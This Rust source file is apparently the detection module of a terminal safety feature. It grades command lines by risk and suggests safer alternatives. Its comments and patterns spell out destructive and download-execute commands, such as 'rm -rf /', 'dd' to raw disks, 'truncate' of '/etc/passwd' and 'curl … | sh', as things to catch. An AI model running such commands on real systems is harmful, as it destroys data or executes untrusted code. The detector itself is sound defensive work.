//! Destructive-command and dangerous-pattern detection (Section 10).
//!
//! [`analyze`] takes a raw command-line string plus a [`PrivilegeContext`]
//! and returns a [`Report`] of [`Finding`]s, each with a [`Risk`] level, a
//! human-readable explanation, and (where possible) a safer alternative.
//! Findings are ordered most-severe first.
//!
//! # Known limits (deliberate, lexer-level)
//!
//! - **Variable indirection is not resolved**: `> $DEV` and
//!   `rm -rf $TARGET` are compared as literal text, so they degrade to
//!   the generic (lower) branches or pass — knowing what `$DEV` holds
//!   requires a shell, not a lexer.
//! - **Process substitution `<(...)` is not modeled**: the lexer turns
//!   `bash <(curl …)` into `bash` with a redirect, not a pipeline, so the
//!   download-execute rule can't see it. Direct `curl … | sh` is caught.
//! - A quoted `sh -c 'body'` / `eval` / `env` / `nohup` wrapper *is*
//!   recursed into — that used to be the biggest gap, not a limit.

use crate::lexer::{lex, Script, SimpleCommand};
use crate::privilege::{Privilege, PrivilegeContext};
use std::fmt;

/// How dangerous a finding is judged to be.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Risk {
    /// Worth a passive note; no confirmation needed.
    Low,
    /// Common footgun; a lightweight confirmation is appropriate.
    Medium,
    /// Can destroy data or the running system; require explicit confirmation.
    High,
    /// Can destroy data *outside the user's control* (another host, a raw
    /// disk, the whole filesystem) or is very likely irreversible; require
    /// type-to-confirm.
    Critical,
}

impl fmt::Display for Risk {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(match self {
            Risk::Low => "low",
            Risk::Medium => "medium",
            Risk::High => "high",
            Risk::Critical => "critical",
        })
    }
}

/// A single detected risk within a command line.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Finding {
    pub risk: Risk,
    /// Machine-readable category, e.g. `"recursive-delete"`, `"raw-disk-write"`.
    pub category: &'static str,
    /// One-sentence, human-readable explanation of what is about to happen.
    pub explanation: String,
    /// The exact command text this finding is about.
    pub command_text: String,
    /// A safer alternative to suggest, if one exists.
    pub suggestion: Option<String>,
    /// Whether the terminal should require the user to type a confirmation
    /// phrase (e.g. the target path) rather than just clicking through.
    pub type_to_confirm: bool,
}

/// The full result of analyzing a command line.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Report {
    pub findings: Vec<Finding>,
}

impl Report {
    /// The single highest risk level found, if any.
    pub fn highest_risk(&self) -> Option<Risk> {
        self.findings.iter().map(|f| f.risk).max()
    }

    pub fn is_empty(&self) -> bool {
        self.findings.is_empty()
    }

    /// True if any finding requires type-to-confirm rather than a simple click-through.
    pub fn requires_type_to_confirm(&self) -> bool {
        self.findings.iter().any(|f| f.type_to_confirm)
    }
}

/// Analyze a raw command line for destructive or otherwise dangerous behavior.
pub fn analyze(input: &str, ctx: &PrivilegeContext) -> Report {
    let script = lex(input);
    let mut findings = Vec::new();

    for cmd in script.commands() {
        check_command(cmd, ctx, &mut findings);
    }

    // Recurse into command substitutions: `$(rm -rf /)` is just as real.
    for sub in &script.substitutions {
        let sub_report = analyze(sub, ctx);
        for mut f in sub_report.findings {
            f.command_text = format!("$({})", f.command_text);
            findings.push(f);
        }
    }

    check_pipelines(&script, ctx, &mut findings);
    check_multi_command_paste(&script, &mut findings, input);

    findings.sort_by_key(|f| std::cmp::Reverse(f.risk));
    Report { findings }
}

fn word_str(w: &str) -> &str {
    w
}

fn program_name(cmd: &SimpleCommand) -> Option<&str> {
    let full = cmd.words.first()?;
    Some(full.rsplit('/').next().unwrap_or(full))
}

fn has_flag(words: &[String], short: &[char], long: &[&str]) -> bool {
    words.iter().any(|w| {
        if let Some(rest) = w.strip_prefix("--") {
            long.contains(&rest)
        } else if let Some(rest) = w.strip_prefix('-') {
            !rest.starts_with('-') && rest.chars().any(|c| short.contains(&c))
        } else {
            false
        }
    })
}

/// Paths whose recursive/forced removal is essentially never intentional.
const CRITICAL_ROOTS: &[&str] = &[
    "/", "/*", "/home", "/home/*", "/etc", "/usr", "/var", "/boot", "/bin", "/sbin", "/lib",
    "~", "~/", "~/*",
];

fn is_root_like(path: &str) -> bool {
    let p = path.trim_end_matches('/');
    p.is_empty() || CRITICAL_ROOTS.contains(&path) || CRITICAL_ROOTS.contains(&p)
}

fn expands_broadly(path: &str) -> bool {
    // Heuristic for wildcard/glob targets that likely touch many files, e.g.
    // "*", "./*", "/var/*". A single "file*.txt" is not flagged.
    let trimmed = path.trim_end_matches('/');
    matches!(trimmed, "*" | "." | ".." | "./*" | "../*" ) || is_root_like(path)
}

/// Paths *inside* the system directories (`/etc/passwd`, `/var/log/...`)
/// — not root-like themselves, but still system-owned.
fn is_system_path(path: &str) -> bool {
    let p = path.trim_end_matches('/');
    ["/etc", "/usr", "/var", "/boot", "/bin", "/sbin", "/lib", "/opt"]
        .iter()
        .any(|dir| p == *dir || p.starts_with(&format!("{dir}/")))
}

fn check_command(cmd: &SimpleCommand, ctx: &PrivilegeContext, findings: &mut Vec<Finding>) {
    let Some(prog) = program_name(cmd) else { return };
    let text = cmd.words.join(" ");

    // Peel off leading `sudo`/`doas`/`pkexec` (possibly nested, e.g.
    // `sudo -u root sudo rm`) to see the real command, and flag the
    // elevation itself.
    let mut elevated = false;
    let mut words: Vec<String> = cmd.words.clone();
    for _ in 0..4 {
        let Some(first) = words.first() else { break };
        let name = first.rsplit('/').next().unwrap_or(first);
        if !matches!(name, "sudo" | "doas" | "pkexec") {
            break;
        }
        elevated = true;
        words = peel_privilege(&words[1..]);
        // `sudo env VAR=1 rm ...` / `sudo nohup rm ...`: peel those too so
        // the real command is what gets checked.
        if words.first().map(|w| w == "env" || w == "nohup").unwrap_or(false) {
            let rest: Vec<&String> = words[1..]
                .iter()
                .skip_while(|a| a.starts_with('-') || a.contains('='))
                .collect();
            words = rest.into_iter().cloned().collect();
        }
    }
    let (effective_prog, effective_args) = match words.split_first() {
        Some((p, rest)) => (Some(p.rsplit('/').next().unwrap_or(p).to_string()), rest.to_vec()),
        None => (None, Vec::new()),
    };

    if elevated {
        findings.push(Finding {
            risk: Risk::Medium,
            category: "root-command",
            explanation: format!(
                "`{prog}` runs the rest of this command with administrator privileges — it can read, change, or delete anything on the system."
            ),
            command_text: text.clone(),
            suggestion: None,
            type_to_confirm: false,
        });
    }

    let Some(ep) = effective_prog.as_deref() else { return };

    match ep {
        "rm" | "rmdir" | "unlink" => {
            check_rm(ep, &effective_args, ctx, &text, findings);
        }
        "shred" => check_shred(&effective_args, &text, findings),
        "find" => check_find_delete(&effective_args, &text, findings),
        "dd" => check_dd(&effective_args, &text, findings),
        "mkfs" | "mke2fs" | "mkswap" | "mkdosfs" => {
            check_mkfs(&effective_args, &text, findings)
        }
        e if e.starts_with("mkfs.") => check_mkfs(&effective_args, &text, findings),
        "fdisk" | "gdisk" | "parted" | "sgdisk" | "cfdisk" => {
            check_partitioning(ep, &effective_args, &text, findings)
        }
        "wipefs" => findings.push(Finding {
            risk: Risk::Critical,
            category: "disk-formatting",
            explanation: "`wipefs` erases filesystem signatures from a device, making its data unrecoverable without specialist tools.".into(),
            command_text: text.clone(),
            suggestion: None,
            type_to_confirm: true,
        }),
        "chmod" => check_chmod(&effective_args, &text, findings),
        "chown" | "chgrp" => check_chown(ep, &effective_args, &text, findings),
        "git" => check_git(&effective_args, &text, findings),
        "pacman" | "yay" | "paru" => check_pacman(ep, &effective_args, &text, findings),
        "curl" | "wget" => {} // handled in pipeline check (piped into a shell)
        "shutdown" | "reboot" | "poweroff" | "halt" | "systemctl" => {
            check_power(ep, &effective_args, &text, findings)
        }
        "kill" | "pkill" | "killall" => check_kill(ep, &effective_args, &text, findings),
        "tee" => check_tee(&effective_args, &text, findings),
        "cp" | "mv" => check_copy_move(ep, &effective_args, &text, findings),
        "truncate" => check_truncate(&effective_args, &text, findings),
        "xargs" => check_xargs(&effective_args, &text, findings),
        "docker" | "podman" => check_container_cli(ep, &effective_args, &text, findings),
        "sh" | "bash" | "zsh" | "dash" | "ksh" | "eval" | "env" | "nohup" => {
            // Wrapper programs hide the real command behind an extra
            // layer — analyze what actually runs. (`sh -c 'rm -rf /'`
            // used to pass clean: the quoted body is one opaque word.)
            let body = match ep {
                "eval" => {
                    let joined = effective_args.join(" ");
                    if joined.trim().is_empty() { None } else { Some(joined) }
                }
                "env" | "nohup" => {
                    let rest: Vec<String> = effective_args
                        .iter()
                        .skip_while(|a| a.starts_with('-') || a.contains('='))
                        .cloned()
                        .collect();
                    let joined = rest.join(" ");
                    if joined.trim().is_empty() { None } else { Some(joined) }
                }
                _ => shell_c_body(&effective_args),
            };
            if let Some(body) = body {
                let inner = analyze(&body, ctx);
                if inner.is_empty() {
                    findings.push(Finding {
                        risk: Risk::Low,
                        category: "hidden-command",
                        explanation: "This runs a nested shell/eval — the real command is inside the quoted text and easy to overlook.".into(),
                        command_text: text.clone(),
                        suggestion: None,
                        type_to_confirm: false,
                    });
                }
                findings.extend(inner.findings);
            }
        }
        "history" if effective_args.iter().any(|a| a == "-c") => {
            findings.push(Finding {
                risk: Risk::Low,
                category: "history-clear",
                explanation: "This clears your shell history for the current session.".into(),
                command_text: text.clone(),
                suggestion: None,
                type_to_confirm: false,
            });
        }
        _ => {}
    }

    check_write_redirects(cmd, &text, findings);
    check_remote_host(cmd, ctx, &text, findings);
    if ctx.looks_like_production && matches!(ep, "rm" | "dd" | "mkfs" | "shutdown" | "reboot" | "poweroff" | "systemctl") {
        findings.push(Finding {
            risk: Risk::High,
            category: "production-server",
            explanation: format!(
                "You appear to be on a production system ({}) — this command's effects will be felt by real users.",
                ctx.host_label.clone().unwrap_or_else(|| "current host".into())
            ),
            command_text: text.clone(),
            suggestion: None,
            type_to_confirm: false,
        });
    }
}

/// Sudo/doas short options that take a separate value argument (e.g.
/// `sudo -u root rm`). Other short flags (`-n`, `-A`, `-l`) carry no
/// separate value; long flags carry theirs inline (`--user=root`).
const PRIVILEGE_VALUE_OPTS: &[char] = &['u', 'g', 'p', 'h', 'C', 'D', 'R', 'T', 'r'];

/// The command a privilege wrapper actually runs: `sudo -u root rm -rf /`
/// peels to `["rm", "-rf", "/"]` — the old skip-while('-') peel stopped at
/// `-u` and treated `"-u"` as the program, so every real check was
/// silently skipped.
fn peel_privilege(args: &[String]) -> Vec<String> {
    let mut i = 0;
    while i < args.len() {
        let a = &args[i];
        if !a.starts_with('-') {
            break;
        }
        if a.len() == 2 && a.chars().nth(1).is_some_and(|c| PRIVILEGE_VALUE_OPTS.contains(&c)) {
            i += 2; // flag plus its value
        } else {
            i += 1;
        }
    }
    args[i..].to_vec()
}

/// The `-c` script body of a shell wrapper: `sh -c 'rm -rf /'` →
/// `"rm -rf /"`. Handles combined flags (`bash -lc '...'`) and an
/// attached short form (`sh -c'...'` lexes the same as separate words,
/// so only the next-arg form exists here).
fn shell_c_body(args: &[String]) -> Option<String> {
    let mut i = 0;
    while i < args.len() {
        let a = &args[i];
        if a == "-c" || (a.starts_with('-') && a.contains('c') && a.len() <= 4) {
            return args.get(i + 1).cloned();
        }
        i += 1;
    }
    None
}

fn check_rm(prog: &str, args: &[String], _ctx: &PrivilegeContext, text: &str, findings: &mut Vec<Finding>) {
    let recursive = has_flag(args, &['r', 'R'], &["recursive"]);
    let forced = has_flag(args, &['f'], &["force"]);
    let targets: Vec<&str> = args.iter().filter(|a| !a.starts_with('-')).map(|s| word_str(s)).collect();

    if prog == "rm" && recursive {
        for t in &targets {
            if is_root_like(t) {
                findings.push(Finding {
                    risk: Risk::Critical,
                    category: "recursive-delete",
                    explanation: format!(
                        "This recursively deletes `{t}`, which looks like a root, home, or system directory — it would destroy the whole tree with no way to get it back."
                    ),
                    command_text: text.to_string(),
                    suggestion: Some(format!("Double-check the path, e.g. `ls {t}` first, or delete a specific subfolder instead.")),
                    type_to_confirm: true,
                });
            } else if expands_broadly(t) {
                findings.push(Finding {
                    risk: Risk::High,
                    category: "recursive-delete",
                    explanation: format!("This recursively deletes everything matched by `{t}` in the current directory."),
                    command_text: text.to_string(),
                    suggestion: Some(format!("Run `ls {t}` first to see what would be removed.")),
                    type_to_confirm: forced,
                });
            } else {
                findings.push(Finding {
                    risk: if forced { Risk::Medium } else { Risk::Low },
                    category: "recursive-delete",
                    explanation: format!("This recursively deletes `{t}` and everything inside it."),
                    command_text: text.to_string(),
                    suggestion: None,
                    type_to_confirm: false,
                });
            }
        }
        if targets.is_empty() && args.iter().any(|a| a.starts_with('-') && a.contains("--no-preserve-root")) {
            findings.push(Finding {
                risk: Risk::Critical,
                category: "recursive-delete",
                explanation: "`--no-preserve-root` disables rm's built-in guard against deleting `/`.".into(),
                command_text: text.to_string(),
                suggestion: None,
                type_to_confirm: true,
            });
        }
    }
}

/// `shred` used to be checked only when its target was a `/dev/` device —
/// `shred -u important_file` (which overwrites and then unlinks a regular
/// file) passed clean.
fn check_shred(args: &[String], text: &str, findings: &mut Vec<Finding>) {
    let targets: Vec<&str> = args.iter().filter(|a| !a.starts_with('-')).map(|s| word_str(s)).collect();
    let on_device = targets.iter().any(|t| t.starts_with("/dev/"));
    let destroys_file = has_flag(args, &['u'], &["remove"]);
    if on_device {
        findings.push(Finding {
            risk: Risk::Critical,
            category: "raw-disk-write",
            explanation: format!(
                "`shred` will overwrite the raw device `{}` with garbage, destroying everything on it.",
                targets.first().unwrap_or(&"")
            ),
            command_text: text.to_string(),
            suggestion: None,
            type_to_confirm: true,
        });
    } else if destroys_file || !targets.is_empty() {
        findings.push(Finding {
            risk: if destroys_file { Risk::High } else { Risk::Medium },
            category: "secure-delete",
            explanation: "`shred` overwrites the target file in place with random data — the original content is unrecoverable afterwards.".into(),
            command_text: text.to_string(),
            suggestion: Some("Make sure the file really is disposable; there is no undo for an overwritten file.".into()),
            type_to_confirm: false,
        });
    }
}

fn check_find_delete(args: &[String], text: &str, findings: &mut Vec<Finding>) {
    let deletes = args.iter().any(|a| a == "-delete")
        || args
            .windows(2)
            .any(|w| (w[0] == "-exec" || w[0] == "-execdir") && (w[1] == "rm" || w[1].starts_with("rm")));
    if deletes {
        findings.push(Finding {
            risk: Risk::High,
            category: "recursive-delete",
            explanation: "This `find` command deletes every matching file — review the filter carefully before running it.".into(),
            command_text: text.to_string(),
            suggestion: Some("Drop `-delete`/`-exec rm` first and re-run to see the list of matches.".into()),
            type_to_confirm: true,
        });
    }
}

fn check_dd(args: &[String], text: &str, findings: &mut Vec<Finding>) {
    let of = args.iter().find_map(|a| a.strip_prefix("of="));
    match of {
        Some(target) if target.starts_with("/dev/") => {
            findings.push(Finding {
                risk: Risk::Critical,
                category: "raw-disk-write",
                explanation: format!("`dd` will overwrite the raw device `{target}` byte-for-byte — any partitions, filesystems, or data on it are destroyed."),
                command_text: text.to_string(),
                suggestion: Some(format!("Confirm `{target}` is really the intended disk with `lsblk` before running this.")),
                type_to_confirm: true,
            });
        }
        Some(_) => {}
        None => {
            findings.push(Finding {
                risk: Risk::Medium,
                category: "raw-disk-write",
                explanation: "`dd` with no `of=` writes to standard output; if this was meant to target a disk, the missing `of=` means the wrong thing may happen.".into(),
                command_text: text.to_string(),
                suggestion: None,
                type_to_confirm: false,
            });
        }
    }
}

fn check_mkfs(args: &[String], text: &str, findings: &mut Vec<Finding>) {
    if let Some(target) = args.iter().rev().find(|a| !a.starts_with('-')) {
        findings.push(Finding {
            risk: Risk::Critical,
            category: "disk-formatting",
            explanation: format!("This creates a new, empty filesystem on `{target}`, permanently erasing everything currently stored there."),
            command_text: text.to_string(),
            suggestion: Some(format!("Run `lsblk` or `blkid` to double-check `{target}` is the disk you mean.")),
            type_to_confirm: true,
        });
    }
}

fn check_partitioning(prog: &str, args: &[String], text: &str, findings: &mut Vec<Finding>) {
    let read_only = matches!(prog, "fdisk" | "gdisk" | "cfdisk") && args.iter().any(|a| a == "-l" || a == "-l1" || a == "-p");
    let write_like = args.iter().any(|a| ["mklabel", "mkpart", "rm", "resizepart", "--script"].contains(&a.as_str()));
    if !read_only {
        findings.push(Finding {
            risk: if write_like { Risk::Critical } else { Risk::High },
            category: "partitioning",
            explanation: format!("`{prog}` edits disk partition tables. Getting the target device wrong can destroy every partition on that disk."),
            command_text: text.to_string(),
            suggestion: Some("Run with a read-only/list flag first (e.g. `-l`) to confirm the target device.".into()),
            type_to_confirm: write_like,
        });
    }
}

fn check_chmod(args: &[String], text: &str, findings: &mut Vec<Finding>) {
    let recursive = has_flag(args, &['R'], &["recursive"]);
    let mode_like = |a: &str| a.starts_with('-') || a.chars().all(|c| c.is_ascii_digit()) || a.contains('+') || a.contains('=');
    let targets: Vec<&str> = args.iter().map(|s| s.as_str()).filter(|a| !mode_like(a)).collect();
    if !recursive {
        // `chmod 777 /etc/passwd` used to pass clean because only the
        // recursive form was checked — a mode change on a system file can
        // break login/SSH/sudo just as badly.
        if targets.iter().any(|t| is_root_like(t) || is_system_path(t)) {
            findings.push(Finding {
                risk: Risk::Medium,
                category: "recursive-permission",
                explanation: "This changes permissions on a system path; a wrong mode can break login, sudo, or SSH.".into(),
                command_text: text.to_string(),
                suggestion: Some("Double-check the mode and the target path before running this.".into()),
                type_to_confirm: false,
            });
        }
        return;
    }
    let broad_mode = args.iter().any(|a| a == "777" || a == "a+rwx" || a == "+rwx" || a == "000");
    let target_root = targets.iter().any(|t| is_root_like(t) || expands_broadly(t));
    if broad_mode || target_root {
        findings.push(Finding {
            risk: if target_root { Risk::High } else { Risk::Medium },
            category: "recursive-permission",
            explanation: "Recursively changing permissions this broadly can break login, sudo, SSH, and other tools that refuse to work with overly permissive files.".into(),
            command_text: text.to_string(),
            suggestion: Some("Scope the change to the specific files/directories that need it instead of a whole tree.".into()),
            type_to_confirm: false,
        });
    }
}

fn check_chown(prog: &str, args: &[String], text: &str, findings: &mut Vec<Finding>) {
    let recursive = has_flag(args, &['R'], &["recursive"]);
    let targets: Vec<&str> = args.iter().map(|s| s.as_str()).filter(|a| !a.starts_with('-')).collect();
    let target_root = targets.iter().skip(1).any(|t| is_root_like(t) || expands_broadly(t) || is_system_path(t));
    if recursive && target_root {
        findings.push(Finding {
            risk: Risk::High,
            category: "recursive-permission",
            explanation: format!("This recursively changes ownership of a broad or system path, which can lock you out of your own files or break installed software (`{prog}`)."),
            command_text: text.to_string(),
            suggestion: None,
            type_to_confirm: false,
        });
    } else if !recursive && target_root {
        findings.push(Finding {
            risk: Risk::Medium,
            category: "recursive-permission",
            explanation: "This changes ownership of a system path; a wrong owner can break login, sudo, or SSH.".into(),
            command_text: text.to_string(),
            suggestion: None,
            type_to_confirm: false,
        });
    }
}

fn check_git(args: &[String], text: &str, findings: &mut Vec<Finding>) {
    if args.is_empty() {
        return;
    }
    let sub = args[0].as_str();
    let rest = &args[1..];
    match sub {
        "push" if rest.iter().any(|a| a == "--force" || a == "-f" || a == "--force-with-lease") => {
            findings.push(Finding {
                risk: Risk::High,
                category: "git-destructive",
                explanation: "A force-push overwrites the remote branch's history — anyone else's commits on top of it can be silently lost.".into(),
                command_text: text.to_string(),
                suggestion: Some("Prefer `git push --force-with-lease`, and make sure nobody else has pushed to this branch since you last pulled.".into()),
                type_to_confirm: false,
            });
        }
        "reset" if rest.iter().any(|a| a == "--hard") => {
            findings.push(Finding {
                risk: Risk::Medium,
                category: "git-destructive",
                explanation: "`git reset --hard` discards uncommitted changes and moves the branch pointer, permanently losing any work not committed or stashed.".into(),
                command_text: text.to_string(),
                suggestion: Some("Consider `git stash` first if you might want these changes back.".into()),
                type_to_confirm: false,
            });
        }
        "clean" if rest.iter().any(|a| a.starts_with('-') && a.contains('f')) => {
            let dry = rest.iter().any(|a| a.contains('n'));
            if !dry {
                findings.push(Finding {
                    risk: Risk::Medium,
                    category: "git-destructive",
                    explanation: "`git clean -f` permanently deletes untracked files from your working tree.".into(),
                    command_text: text.to_string(),
                    suggestion: Some("Run `git clean -nf` first to preview exactly what would be removed.".into()),
                    type_to_confirm: false,
                });
            }
        }
        "branch" if rest.iter().any(|a| a == "-D") => {
            findings.push(Finding {
                risk: Risk::Low,
                category: "git-destructive",
                explanation: "`-D` force-deletes a branch even if it has unmerged commits.".into(),
                command_text: text.to_string(),
                suggestion: None,
                type_to_confirm: false,
            });
        }
        "checkout" | "restore" if rest.iter().any(|a| a == ".") => {
            findings.push(Finding {
                risk: Risk::Low,
                category: "git-destructive",
                explanation: "This discards uncommitted local changes to match the last commit.".into(),
                command_text: text.to_string(),
                suggestion: None,
                type_to_confirm: false,
            });
        }
        _ => {}
    }
}

fn check_pacman(prog: &str, args: &[String], text: &str, findings: &mut Vec<Finding>) {
    let removes = args.iter().any(|a| ["-R", "-Rs", "-Rns", "-Rdd", "--remove"].contains(&a.as_str()))
        || (prog != "pacman" && args.iter().any(|a| a == "-R" || a == "remove"));
    let force = args.iter().any(|a| a == "-Rdd" || a == "--nodeps" || (a.starts_with('-') && a.contains("dd")));
    if removes {
        findings.push(Finding {
            risk: if force { Risk::Medium } else { Risk::Low },
            category: "package-removal",
            explanation: format!("This removes one or more packages with `{prog}`{}.", if force { " while skipping dependency checks, which can break other installed software" } else { "" }),
            command_text: text.to_string(),
            suggestion: Some(format!("Run `{prog} -Qi <package>` first to see what depends on it.")),
            type_to_confirm: false,
        });
    }
    if args.iter().any(|a| a == "-Scc" || a == "-Sc") {
        findings.push(Finding {
            risk: Risk::Low,
            category: "package-removal",
            explanation: "This clears the package cache, so you won't be able to downgrade or reinstall from cache without re-downloading.".into(),
            command_text: text.to_string(),
            suggestion: None,
            type_to_confirm: false,
        });
    }
}

fn check_power(prog: &str, args: &[String], text: &str, findings: &mut Vec<Finding>) {
    let is_shutdown_like = matches!(prog, "shutdown" | "reboot" | "poweroff" | "halt")
        || (prog == "systemctl" && args.iter().any(|a| ["poweroff", "reboot", "halt", "shutdown"].contains(&a.as_str())));
    if is_shutdown_like {
        findings.push(Finding {
            risk: Risk::Medium,
            category: "power-state",
            explanation: "This will shut down or restart the machine, interrupting anything currently running.".into(),
            command_text: text.to_string(),
            suggestion: None,
            type_to_confirm: false,
        });
    } else if prog == "systemctl" && args.iter().any(|a| a == "stop" || a == "disable" || a == "mask") {
        findings.push(Finding {
            risk: Risk::Low,
            category: "service-state",
            explanation: "This stops or disables a system service.".into(),
            command_text: text.to_string(),
            suggestion: None,
            type_to_confirm: false,
        });
    }
}

fn check_kill(prog: &str, args: &[String], text: &str, findings: &mut Vec<Finding>) {
    let sigkill = args.iter().any(|a| a == "-9" || a == "-KILL" || a == "-SIGKILL");
    let broad = matches!(prog, "pkill" | "killall") && args.iter().any(|a| a == "-1" || a == "-u" || a == "-9");
    // A PID of `-1` means "every process you can signal" — with *any*
    // signal. (`kill -1 <pid>` just sends SIGHUP to one process; the old
    // check flagged that as Critical while missing the real `kill -9 -1`.)
    let pid_minus_one = args.iter().skip(1).any(|a| a == "-1");
    if prog == "kill" && pid_minus_one {
        findings.push(Finding {
            risk: Risk::Critical,
            category: "process-kill",
            explanation: "A PID of `-1` sends the signal to every process you're allowed to signal — this can terminate your whole session and every service you own.".into(),
            command_text: text.to_string(),
            suggestion: None,
            type_to_confirm: true,
        });
        return;
    }
    if broad {
        findings.push(Finding {
            risk: Risk::Medium,
            category: "process-kill",
            explanation: format!("`{prog}` with a broad selector and a hard kill signal can take down unrelated processes without giving them a chance to clean up."),
            command_text: text.to_string(),
            suggestion: None,
            type_to_confirm: false,
        });
    } else if sigkill {
        findings.push(Finding {
            risk: Risk::Low,
            category: "process-kill",
            explanation: "SIGKILL terminates the process immediately without letting it save state or clean up.".into(),
            command_text: text.to_string(),
            suggestion: None,
            type_to_confirm: false,
        });
    }
}

fn check_write_redirects(cmd: &SimpleCommand, text: &str, findings: &mut Vec<Finding>) {
    for r in &cmd.redirects {
        if r.is_write() && r.target.starts_with("/dev/") && r.target != "/dev/null" && r.target != "/dev/stdout" && r.target != "/dev/stderr" {
            findings.push(Finding {
                risk: Risk::Critical,
                category: "raw-disk-write",
                explanation: format!("This redirects output straight onto the device `{}`, which can corrupt or destroy whatever filesystem is on it.", r.target),
                command_text: text.to_string(),
                suggestion: None,
                type_to_confirm: true,
            });
        } else if r.is_truncating() && (is_root_like(&r.target) || is_system_path(&r.target)) {
            // `> /etc/passwd` used to pass: only bare critical roots were
            // checked, not files inside them.
            findings.push(Finding {
                risk: Risk::High,
                category: "raw-disk-write",
                explanation: format!(
                    "This truncates `{}`{} — everything currently in the file is gone.",
                    r.target,
                    if is_system_path(&r.target) { " (a system file)" } else { "" }
                ),
                command_text: text.to_string(),
                suggestion: None,
                type_to_confirm: false,
            });
        }
    }
}

/// `cat image.iso | tee /dev/sda` — `tee` was entirely unchecked, so the
/// pipeline form of a raw-disk write passed clean.
fn check_tee(args: &[String], text: &str, findings: &mut Vec<Finding>) {
    let targets: Vec<&str> = args.iter().filter(|a| !a.starts_with('-')).map(|s| word_str(s)).collect();
    for t in targets {
        if t.starts_with("/dev/") && t != "/dev/null" && t != "/dev/stdout" && t != "/dev/stderr" {
            findings.push(Finding {
                risk: Risk::Critical,
                category: "raw-disk-write",
                explanation: format!("`tee` writes everything piped into it straight onto the device `{t}`, overwriting whatever is there."),
                command_text: text.to_string(),
                suggestion: None,
                type_to_confirm: true,
            });
        }
    }
}

/// `cp backup.img /dev/sda` / `mv /home /dev/null` — `cp` and `mv` were
/// entirely unchecked, so writing to (or discarding into) a raw device
/// passed clean.
fn check_copy_move(prog: &str, args: &[String], text: &str, findings: &mut Vec<Finding>) {
    let Some(dest) = args.iter().rev().find(|a| !a.starts_with('-')) else { return };
    if dest.starts_with("/dev/") && dest != "/dev/null" && dest != "/dev/stdout" && dest != "/dev/stderr" {
        findings.push(Finding {
            risk: Risk::Critical,
            category: "raw-disk-write",
            explanation: format!("`{prog}` writes straight onto the device `{dest}`, clobbering whatever filesystem or data is on it."),
            command_text: text.to_string(),
            suggestion: Some(format!("Confirm `{dest}` is really the intended target with `lsblk` first.")),
            type_to_confirm: true,
        });
    } else if dest == "/dev/null" && prog == "mv" {
        findings.push(Finding {
            risk: Risk::Medium,
            category: "recursive-delete",
            explanation: "`mv` into `/dev/null` discards the moved file(s) — the data is not recoverable afterwards.".into(),
            command_text: text.to_string(),
            suggestion: None,
            type_to_confirm: false,
        });
    }
}

/// `truncate -s 0 /etc/passwd` — `truncate` was entirely unchecked.
fn check_truncate(args: &[String], text: &str, findings: &mut Vec<Finding>) {
    let zero_size = args.windows(2).any(|w| (w[0] == "-s" || w[0] == "--size") && (w[1] == "0" || w[1] == "+0" || w[1] == "-0"));
    let targets: Vec<&str> = args.iter().filter(|a| !a.starts_with('-')).map(|s| word_str(s)).collect();
    let system_target = targets.iter().any(|t| is_root_like(t) || is_system_path(t));
    if system_target {
        findings.push(Finding {
            risk: Risk::Critical,
            category: "raw-disk-write",
            explanation: format!("`truncate` empties `{}` — a system file (or path) is reduced to zero bytes and its content is gone.", targets.first().unwrap_or(&"")),
            command_text: text.to_string(),
            suggestion: None,
            type_to_confirm: true,
        });
    } else if zero_size && !targets.is_empty() {
        findings.push(Finding {
            risk: Risk::Medium,
            category: "raw-disk-write",
            explanation: "`truncate -s 0` empties the target file to zero bytes; the content is not recoverable afterwards.".into(),
            command_text: text.to_string(),
            suggestion: None,
            type_to_confirm: false,
        });
    }
}

/// `find ... | xargs rm -rf` — the destructive part was invisible to the
/// per-command check because it runs on whatever arrives via stdin.
fn check_xargs(args: &[String], text: &str, findings: &mut Vec<Finding>) {
    let Some(first) = args.first() else { return };
    let name = first.rsplit('/').next().unwrap_or(first);
    if matches!(
        name,
        "rm" | "shred" | "dd" | "truncate" | "mv" | "kill" | "killall" | "chmod" | "chown" | "mkfs" | "sh" | "bash" | "zsh",
    ) {
        findings.push(Finding {
            risk: Risk::High,
            category: "xargs-destructive",
            explanation: format!(
                "This runs `{}` on every path piped in from the previous command — an unexpectedly broad match would delete or overwrite far more than intended.",
                args.join(" ")
            ),
            command_text: text.to_string(),
            suggestion: Some("Preview with `xargs echo` (or `xargs printf '%s\\n'`) before running the destructive form.".into()),
            type_to_confirm: false,
        });
    }
}

/// `docker system prune -af`, `podman volume prune` — container CLIs were
/// entirely unchecked.
fn check_container_cli(prog: &str, args: &[String], text: &str, findings: &mut Vec<Finding>) {
    if args.iter().any(|a| a == "prune") {
        findings.push(Finding {
            risk: Risk::Medium,
            category: "container-destructive",
            explanation: format!("`{prog} prune` deletes unused containers/images/volumes in one go — data a running setup may still need can disappear."),
            command_text: text.to_string(),
            suggestion: Some("Run the plain `prune` (without `-a`) first to see what it counts as unused.".into()),
            type_to_confirm: false,
        });
    }
}

fn check_remote_host(cmd: &SimpleCommand, ctx: &PrivilegeContext, text: &str, findings: &mut Vec<Finding>) {
    if program_name(cmd) == Some("ssh") && ctx.privilege == Privilege::Root {
        let _ = text; // reserved for future host-specific wording
    }
    if ctx.is_remote && matches!(program_name(cmd), Some("rm" | "dd" | "mkfs" | "shutdown" | "reboot")) {
        findings.push(Finding {
            risk: Risk::Medium,
            category: "remote-host",
            explanation: format!(
                "You're running this on a remote host{} — double-check you're connected to the machine you think you are.",
                ctx.host_label.as_ref().map(|h| format!(" ({h})")).unwrap_or_default()
            ),
            command_text: text.to_string(),
            suggestion: None,
            type_to_confirm: false,
        });
    }
}

/// Detects `curl ... | sh`-style "download and execute" pipelines, which
/// run arbitrary remote code with the current user's (or sudo's) privileges.
fn check_pipelines(script: &Script, _ctx: &PrivilegeContext, findings: &mut Vec<Finding>) {
    for pipeline in &script.pipelines {
        if pipeline.commands.len() < 2 {
            continue;
        }
        // `curl … | sh` and the encode/transform variants
        // (`base64 -d | sh`, `openssl enc -d … | sh`) — the old check only
        // recognized curl/wget/fetch as the feeder, so anything that
        // *decodes* content into shell text passed clean.
        let has_feeder = pipeline.commands[..pipeline.commands.len() - 1]
            .iter()
            .any(|c| {
                matches!(
                    program_name(c),
